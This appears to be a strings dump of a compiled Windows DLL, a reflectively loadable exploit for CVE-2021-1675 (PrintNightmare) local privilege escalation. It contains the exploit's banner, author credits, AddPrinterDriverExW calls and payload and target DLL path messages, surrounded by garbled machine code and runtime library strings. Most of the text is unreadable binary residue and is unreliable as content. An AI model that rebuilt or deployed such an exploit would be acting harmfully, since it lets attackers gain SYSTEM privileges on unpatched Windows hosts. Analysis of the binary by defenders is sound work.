!This program cannot be run in DOS mode.
Rich
.text
`.rdata
@.data
.pdata
@_RDATA
@.rsrc
@.reloc
L$ SVWH
t$ L
0_^[
D$(H
D$ D
|$(L
D$ 3
l$HH
\$@H
t$PH
t$ UH
D$TE3
D$03
D$P3
D$(E
D$TH
D$03
D$PH
D$(L
D$P3
D$ L
9|$T
D$8H
D$(A
T$`H
;|$T
L$PA
T$PH
D$HL
D$ H
D$PH
D$@A
D$83
SAVAWH
l$xE3
t$83
d$(E3
l$ E3
HcU<H
<*PE
|$0H
l$hH
IcA<B
|t	A
|u	D
V IcB<B
|$pA
l$hLc}<3
y$HcF<
l$ M
M+O0A
d$(H
|$0H
t$8H
t}ff
T$pL
@A_A^[
|$ AVH
D$@@
\$0H
t$8H
|$HH
\$@H
VWAVH
\$xH
@A^_^
\$0H
t$8H
D$8H
D$8H
D$@H
D$(H
D$(H
T$0H
\$ WH
T$PH
L$XH
T$PL
L$0L
L$`H
L$(3
\$hH
@SVWH
T$`H
L$hH
T$`L
L$0L
L$pH
L$(3
@_^[
\$ UH
M H1E
 H3E H3E
\$HH
t!eH
L$PH
\$0H
l$8H
t$@H
uxHc
uTL+
L$0L
L$(H
L$ 3
L$PH
D$PH
D$@H
D$H3
\$0H
\$0H
ntelA
GenuD
ineI
t(=`
t!=p
 w$H
T$ H
D$ "
D$ $
\$(3
t$0H
HfA;(
fA;8unI
fA;(t(fA98t
WATAUAVAWH
_8M+
l$0H
|$8;3
L$0I
x}~t
D$(I
 tDE3
\$@I
A_A^A]A\_
9csm
A - 
t7HcP
t=L;
ffff
t#eH
\$0H
t$8H
ffff
ffffff
fffffff
ob0f
obpf
fffff
WATAUAVAWH
Wu-D
\$PH
l$XH
t$`H
 A_A^A]A\_
\$0H
\$0H
t$8H
L$0H
T$8D
D$@H
T$8H
L$0H
T$8D
D$@H
L$0H
T$8H
T$8H
L$0H
T$8L
D$@D
L$HE
T$8A
x AVH
N0E3
\$0H
l$8H
t$@H
|$HH
L$ WH
\$0H
L$ VWAVH
\$8I;
D$ H
D$ L
D$@H
D$HH
L$PH
T$XH
D$ H
D$(H
D$0L
L$(L
D$@H
T$0H
`A^_^
L$ WH
\$0H
EE(H
\$0H
t$8H
L$HH
D$HH
D$XL
L$PH
D$HL
D$XH
T$ H
D$PH
L$@H
WAVAWH
fD9>t
>:u<M
.u	H
tRI;
W8H+
W(I+
\$@H
l$HH
t$PH
 A_A^_
L$ WH
\$0H
v	H;
\$0H
l$8H
t$@H
D+AHH
E+BHH
x AVH
\$0H
l$8H
t$@H
|$HH
\$0H
t$8H
UWAVH
L$ @
D$(H
L$@L
t$PL
t$hL
t$pD
t$xfD
D$@H
D$HL
L$XL
T$`D
D8t$8t
A^_]
VWAVH
D$@H;G
\$H@
l$PH
 A^_^
\$0H
|$8H
 t(<#t
<0uG
AA<Fu
<Nu'
<htl<jt\<lt4<tt$<wt
8<6u
,X< w
t$ WAVAWH
<Ct-<D
<StW@:
tg<Zt
<g~{<itd<ntY<ot7<pt
<utT@:
D$P3
D$P-
D$P+
D$P I
D<P0@:
t<QH
k4+kP+
D$ H
T$PI
\$XH
l$`H
t$hH
0A_A^_
w.Hc
AA,c
AA,A$
yAgt
yAGu
D$`H
D$@H
L$(H
L$`H
T$ H
CA,G
K0@H
,I<%w
CAsH
\$hH
CA,c
x AVH
HcS8
\$0H
l$8H
t$@H
|$HH
HcC(H
\$0H
CA,c
KHIc
KHIc
T$4D
D$0E
T$4H
;{Pu
L$@H3
\$hH
t$pH
x ATAVAWH
|$`I
8*u;I
\$@H
l$HH
t$PH
|$XH
 A_A^A\
\$0H
l$8H
t$@H
\$0H
\$0H
l$8H
t$@H
L$ WH
\$0H
u3HcH<H
\$`H
t(eH
L$8H
L$8H
x ATAVAWH
|$`M
< t=<	t9
\$@H
l$HH
t$PH
|$XH
 A_A^A\
UVWAVAWH
@8>u
D$ E3
H9:t
H98u
0A_A^_^]
H9=-
\$0H
WAVAWH
A84.u
<=t5
\$PH
t$`H
l$XH
0A_A^_
t$ E3
\$0H
L$ WH
\$0H
WAVAWH
\$@H
l$HH
t$PH
 A_A^_
D$PI
x AUAVAWH
D$(H
<	w	@
	w	@
t2A;
s-A;
@88t
t@A;
\$`H
l$hH
t$pH
|$xH
@A_A^A]
\$0H
l$8H
t$@H
UWAVH
L$pA
D$pH
D$HH
T$@I
L$XH
T$@L
L$0M
L$`H
L$(H
L$ 3
t$pH
A^_]
T$`D
T$ L
\$@H
l$HH
t$PH
L$`I
D$`H
\$0H
t7SH
WATAUAVAWH
\$PH
l$XH
t$`H
 A_A^A]A\_
\$0H
\$0H
t$8H
D$@L
L$8H
L$(H
L$ H
\$`H
l$hH
t$pH
\$0H
\$$;
tmHc
D$ H
D$ H
\$@H
x AVH
fD9t$b
D$hH
x AVH
\$0H
l$8H
t$@H
|$HH
L$ WH
\$0H
T$XL
L$PH
T$XH
D$ L
D$ H
UVWATAUAVAWH
L$XE3
L$DD
D8\0>t
H}-H
L$HH
D$HH
\$8H
\$0E
L$LD
\$ H
9t$L
L$Lf
D$DE
\$ H
~-H+
L$@D8]
A_A^A]A\_^]
L$@8]
VWAV
\$@H;
D$@+
L$0D
T$@I
A^_^
VWAV
\$@H;
D$@H+
L$0H
A^_^
VWATAVAW
D$PI;
L$PH
D$PH+
D$(U
L$ D
L$@D
t$@;
A_A^A\_^
WATAUAVAWH
\$XH
t$`H
 A_A^A]A\_
\$ UVWATAUAVAWH
H!D$ H
`A_A^A]A\_^]
\$0A
\$0A
D$(H
\$PH
t$XH
L$ H
T$(H
T$ 3
@8*u
@8l$Ht
L$8D
~/A;
D$(H
r>@8o
D$(A
D$8H
\$`H
l$hH
t$pH
L$ UVWH
`_^]
D$8L
t$(3
wu	H
wu	I
fA9	t	I
fA9	
L$ WH
\$0H
L$ WH
\$0H
L$ WH
\$0H
L$ WH
\$0H
\$0H
\$0H
t$8H
\$0H
t$8H
WATAUAVAWH
D$HL
t$@I
D$8H
|$(H
D$XH
d|.H
gfffffffH
D8t$ht
A_A^A]A\_
|$@-H
D$(3
D$8H
\$`H
l$hH
t$pH
x AWH
\$`H
l$hH
t$pH
|$xH
D$8H
80tWD
gfffA
x AVH
T$xH
D$(H
\$P3
l$XH
t$`H
|$hH
t$DE3
|$@-D
D$(I+
L$ A
L$@H
}=D;
L$@D
D$(H
D$8H
\$`H
l$hH
|$pH
x ATAVAWH
L9?|
L9?}
\$@H
l$HH
t$PH
|$XH
 A_A^A\
x AVH
D$HI
T$8H
D$(L
L$ M
D$PI
D$TE3
|$P-H
t$(A
D$ I+
L$PH
D$(D
t$HI
T$8H
D$(L
L$ M
t$HI
T$8H
D$(L
L$ M
\$`I
\$0H
t4SH
L$ WH
\$ H
H93t
\$@H
t$HH
D$8I
D$@I
\$0eH
H 9Y
x AVH
u"8Z(t
uUH9Z
uF8Z(t
\$(L
vC8_(t
L$(L
D$ A
\$@H
t$PH
|$XH
x AVH
u"8Z(t
uTH9Z
uF8Z(t
\$8A
\$0L
\$(3
vB8_(t
\$8L
\$03
L$(A
\$PH
t$`H
|$hH
UVWATAUAVAWH
EP*?H
}PI+
UXM;
C8<(u
EXM;
`A_A^A]A\_^]
|$ E3
WATAUAVAWH
@84)u
\$`H
l$hH
t$pH
0A_A^A]A\_
H97u+A
mL+7H
t$ E3
\$ UVWATAUAVAWH
,/<-w
L$0H
D$8A
@8|$Ht
@8|$Ht
@8|$Ht
|$(H
|$ H
M+4$I
|$pH
L$PH
|$xH
D$XD9x
@8|$ht
@8|$ht
@8|$ht
T$pH
t <.u
t)I+
A_A^A]A\_^]
8Z(t
u0H9Z
u"8Z(t
\$8A
\$0L
\$(3
8_(t
\$8L
\$03
\$PH
t$`H
L$ H
\$@3
D$HH
D$XH
D$(A
8D$8t
T$@H
D$`H
L$ WH
\$0H
\$0H
l$8H
t$@H
D$VH
D$p 
D$8H
t$0H
D$8H
t$0H
L$ L
UVWH
\$`H
@_^]
\$0H;
L$0H;
\$8H
t$@H
UVWATAUAVAWH
D$8H
L$&8\$&t,8Y
t>8Z
L$8H3
@A_A^A]A\_^]
*u/3
D$HE
L$@L
D$HL
L$@E
x AVH
fD90t
fD94Fu
fD96u
t$8H+
t$0H
t$(3
t$ 3
t$8D
t$0L
l$(3
\$PH
t$`H
l$XH
|$hH
\$0H
l$8H
t$@H
t1H;
\$0H
t$8H
L$ WH
\$0H
D$8I
D$@I
\$ VWATAUAVH
D!l$xA
@A^A]A\_^
D$0I
D$(H;
T$0H
L$0H
D$0H
D$(H
WAVAWH
\$@H
l$HH
t$PH
 A_A^_
\$0H
\$8H
\$0H
t$@H
l$8H
\$0H
t$8H
\$@H
t$HH
|$PH
\$ ;
\$0H
t$8H
|$@H
s*Hc
s&Hc
WATAUAVAWH
\$XH
t$`H
 A_A^A]A\_
D$HH
D$HH
\$0H
t$8H
WATAUAVAWH
D8/u
L$PH
\$XH
l$`H
 A_A^A]A\_
D8/u
D$(H
\$0H
l$8H
t$@H
t0SH
\$0H
\$0H
WAVAWH
?0t0
\$@H
l$HH
t$PH
 A_A^_
SUVWATAVAWH
D$DH
l$@L
\$ E
\$8H
D$0E;
L$0E
D$(I
L$ A
D$(3
A_A^A\_^][
@USVWATAVAWH
L$8M
L$hL
D$hA
|$pH
|$0H#
D$XH
T$XL
t$`I
swkA
swkA
svBE3
\$DH
T$8E
u!E;
st]A
\$DA
L$XH
T$8E
L$HH
+L$LA
taE3
\$HH
T$XE
u!E;
st]A
\$HA
T$XE
T$DL
+T$P
tjA;
t$0H+
D8|$0A
u8E3
A_A^A\_^[]
\$0H
t$8H
B8 t
T$0A
\$8H
t$@H
D$83
T$0H
D$0H9D$8
\$0H
K H;
K(H;
K0H;
K8H;
K@H;
KHH;
KhH;
KpH;
KxH;
tfSH
KXH;
K`H;
\$0H
t$8H
\$0H
l$8H
@UATAUAVAWH
l$0H
\$0H
t$(M
M H3
e0A_A^A]A\]
ATAUAVH
L$ fff
L$ H
s I+
L$ |+L;
L$ I;
L$ L;
A^A]A\
D$@3
L$@H3
L$0H
\$PH
@UATAUAVAWH
l$PH
Hc]`M
t$PH
d$(D
D$(I
tSH;
\$PH
|$(I
H!T$0D
ue!T$(H!T$ 
A_A^A]A\]
D$(H
D$@L
D$8H
D$0H
\$pI
\$0H
L$ WH
\$0H
T$XL
L$PH
T$XH
D$ L
D$ H
\$0H
UVWAVAWH
D$0E3
fE9S
L$0H3
\$xH
@A_A^_^]
\$0D
\$(H
\$PH
t$`H
D$09
D$49C
D$8H
@CH;
ot$ H
ffffff
ot$ H
ot$ H
ot$ H
ot$ H
ot$ H
fffffff
ot$ H
t'H;
ot$ H
|$ D
|$ fA
\$0H
ATAVAWH
\$@=
\$@A
\$HH
t$PH
 A_A^A\
D$@H
t$83
USVWAVH
D$@H
D$PH
D$HH
D$(H
T$@H
L$`H
D$@M
D$HH
A^_^[]
T$ H
D$ D
D$8A
D$("
t$xL
(t$PH
D$xH
D$(H
D$pH
t>H=
t&H=
!P H
!P`H
A A#
B`A#
\$8H
t$@H
|$HH
t$ WH
\$@H
t$HH
LcA<E3
t"H+
\$0H
u HcA<H
T$ L
@SUH
8csm
__based(
__cdecl
__pascal
__stdcall
__thiscall
__fastcall
__vectorcall
__clrcall
__eabi
__swift_1
__swift_2
__ptr64
__restrict
__unaligned
restrict(
 new
 delete
operator
`vftable'
`vbtable'
`vcall'
`typeof'
`local static guard'
`string'
`vbase destructor'
`vector deleting destructor'
`default constructor closure'
`scalar deleting destructor'
`vector constructor iterator'
`vector destructor iterator'
`vector vbase constructor iterator'
`virtual displacement map'
`eh vector constructor iterator'
`eh vector destructor iterator'
`eh vector vbase constructor iterator'
`copy constructor closure'
`udt returning'
`RTTI
`local vftable'
`local vftable constructor closure'
 new[]
 delete[]
`omni callsig'
`placement delete closure'
`placement delete[] closure'
`managed vector constructor iterator'
`managed vector destructor iterator'
`eh vector copy constructor iterator'
`eh vector vbase copy constructor iterator'
`dynamic initializer for '
`dynamic atexit destructor for '
`vector copy constructor iterator'
`vector vbase copy constructor iterator'
`managed vector copy constructor iterator'
`local static thread guard'
operator "" 
operator co_await
operator<=>
 Type Descriptor'
 Base Class Descriptor at (
 Base Class Array'
 Class Hierarchy Descriptor'
 Complete Object Locator'
`anonymous namespace'
FlsAlloc
FlsFree
FlsGetValue
FlsSetValue
InitializeCriticalSectionEx
(null)
CorExitProcess
AreFileApisANSI
LCMapStringEx
LocaleNameToLCID
AppPolicyGetProcessTerminationMethod
NAN(SNAN)
nan(snan)
NAN(IND)
nan(ind)
e+000
Sunday
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
January
February
March
April
June
July
August
September
October
November
December
MM/dd/yy
dddd, MMMM dd, yyyy
HH:mm:ss
 !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
 !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
d8L2
[aOni*{
@2&@
"RP(
eLK(w
FEMh
h0'D
owM&
~ $s%r
@b;zO]
$qE}
;*xh
["93
iu+-,
\lo}
obwQ4
&Sgw
R	E]
?nz(
=87M
v2!L.2
	cQr
X/4B
k=yI
^<V7w
W&|.
1#INF
1#QNAN
1#SNAN
1#IND
UUUUUU
UUUUUU
TUUUU
#Ib?
=imb;D
=W>6
:		r
>[^j
>Kb|
+>De
1<.	/>:
11Y@
/>58d%
MJ$>
>cQ6
!>6'Y
>jtm}S
>77:
)>6{1n
r	Vr.>T
+f)>0'
Lj[;>
3>fvw
;H9>&X
*StO9>T
.>Tu
.(!>
n03>Pu
/>	V
S9>H
x.&>
K~Je#>!
-/!>
(>aI
=cQ6
+M<7>
*>f[
o ->
l(>>
c(>\,
ET5>
;>9l
mG4>
bp(=>?g
36,>
37>k
~X3>
6>J`
?>!T
BC?>6t9^	c:>
8'>0
'._M
=4<,
BF>^G
K&>.yC
 'L>[
.xJ>Hf
y\PD>!
|b=})>
c [1>H'
dL?>
uzKs@>
3>N;kU
	kE>fvw
eF>t
L>ev
A>pP&
V6E>`"(5
,=>B
">}t
0iN>/
+h->|
@>%>b
?qBJ
l@6 
?-hk
OZQ%
-)4d
?:kP<
?UUUUUU
?f`Y4
?QY^&
?U)#
?ysB
?$G4
?30]
?7zQ6$
log10
[*] CVE-2021-1675 LPE Exploit
[*] Modified by: xq17 
[*] Code Reference: Halil Dalabasmaz (@hlldz) 
payloadPath: %ls
targetDLLPath: %ls
[*] AddPrinterDriverExW Ok, done!
[-] AddPrinterDriverExW Error, failed!
[*] All done. GetLastError: %d
Error, No Paramter!
GCTL
.text$mn
.text$mn$00
.text$x
.idata$5
.00cfg
.CRT$XCA
.CRT$XCZ
.CRT$XIA
.CRT$XIC
.CRT$XIZ
.CRT$XPA
.CRT$XPX
.CRT$XPXA
.CRT$XPZ
.CRT$XTA
.CRT$XTZ
.rdata
.rdata$voltmd
.rdata$zzzdbg
.rtc$IAA
.rtc$IZZ
.rtc$TAA
.rtc$TZZ
.xdata
.edata
.idata$2
.idata$3
.idata$4
.idata$6
.data
.bss
.pdata
_RDATA
.rsrc$01
.rsrc$02
CVE-2021-1675.x64.dll
?ReflectiveLoader@@YA_KPEAX@Z
FindFirstFileW
FindClose
LocalAlloc
MultiByteToWideChar
GetLastError
LocalFree
ExitProcess
KERNEL32.dll
wsprintfW
USER32.dll
AddPrinterDriverExW
EnumPrinterDriversW
WINSPOOL.DRV
RtlCaptureContext
RtlLookupFunctionEntry
RtlVirtualUnwind
UnhandledExceptionFilter
SetUnhandledExceptionFilter
GetCurrentProcess
TerminateProcess
IsProcessorFeaturePresent
QueryPerformanceCounter
GetCurrentProcessId
GetCurrentThreadId
GetSystemTimeAsFileTime
InitializeSListHead
IsDebuggerPresent
GetStartupInfoW
GetModuleHandleW
RtlUnwindEx
InterlockedFlushSList
SetLastError
EnterCriticalSection
LeaveCriticalSection
DeleteCriticalSection
InitializeCriticalSectionAndSpinCount
TlsAlloc
TlsGetValue
TlsSetValue
TlsFree
FreeLibrary
GetProcAddress
LoadLibraryExW
RaiseException
GetModuleHandleExW
GetModuleFileNameW
HeapAlloc
HeapFree
LCMapStringW
GetStdHandle
GetFileType
FlushFileBuffers
WriteFile
GetConsoleOutputCP
GetConsoleMode
FindFirstFileExW
FindNextFileW
IsValidCodePage
GetACP
GetOEMCP
GetCPInfo
GetCommandLineA
GetCommandLineW
WideCharToMultiByte
GetEnvironmentStringsW
FreeEnvironmentStringsW
GetProcessHeap
SetStdHandle
SetFilePointerEx
GetFileSizeEx
GetStringTypeW
HeapSize
HeapReAlloc
CloseHandle
CreateFileW
WriteConsoleW
                          
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
                          
abcdefghijklmnopqrstuvwxyz
ABCDEFGHIJKLMNOPQRSTUVWXYZ
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
</assembly>
